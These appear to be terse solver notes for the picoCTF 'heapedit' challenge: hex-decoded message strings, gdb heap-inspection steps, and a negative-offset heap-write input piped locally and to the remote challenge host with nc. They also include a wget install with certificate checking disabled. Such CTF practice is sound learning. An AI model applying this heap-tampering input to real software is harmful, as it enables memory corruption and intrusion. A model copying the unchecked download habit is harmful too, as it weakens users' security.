#print '73746172676e6f43662072756f592021203a73692067616c'.decode('hex')

#print '5420217972726f53276e6f77207369687920706c65682074203a756f'.decode('hex')

#print '20736920736968746d6f646e617220612e676e6972747320'.decode('hex')


#install gef:  wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py --no-check-certificate

#gdb ./heapedit
#disassemble main
#b *0x0000000000400a4a
#heap chunks
#heap bins tcache
#find 0x602000,0x623000,"\x90\x38\x60"
#p/d 0x602088-0x00000000006034a0
#printf -- "-5144\n\0\n" | ./heapedit

#printf -- "-5144\n\0\n" | nc mercury.picoctf.net 10097
